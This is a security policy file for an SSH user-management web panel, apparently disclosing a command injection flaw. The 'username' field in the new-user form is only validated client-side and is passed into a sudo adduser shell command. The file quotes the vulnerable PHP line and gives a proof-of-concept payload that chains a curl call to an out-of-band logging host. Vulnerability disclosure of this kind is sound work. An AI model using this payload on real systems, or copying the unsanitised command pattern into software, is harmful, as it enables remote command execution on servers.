# Security Policy

## Supported Versions
latest version. ( 3.7 )

## Reporting a Vulnerability



"username" field in "new user" section have command injection vulnerability !
this field validate on client side section.
and attacker can remove JS code from browser or use burpsuite to bypass validation and RUN OS COMMAND.


vuln code :
https://github.com/Alirezad07/X-Panel-SSH-User-Management/blob/main/Web%20Panel/app/app/Http/Controllers/UserController.php#L92
Process::run("sudo adduser --disabled-password --gecos '' --shell /usr/sbin/nologin {$user->username}");

payload : 
"alireza && curl ck163py2vtc0000x3ej0gjoub5wyyyyyb.oast.fun"

dnslogger for PoC :  https://app.interactsh.com/#/


./ALIREZA_PROMIS
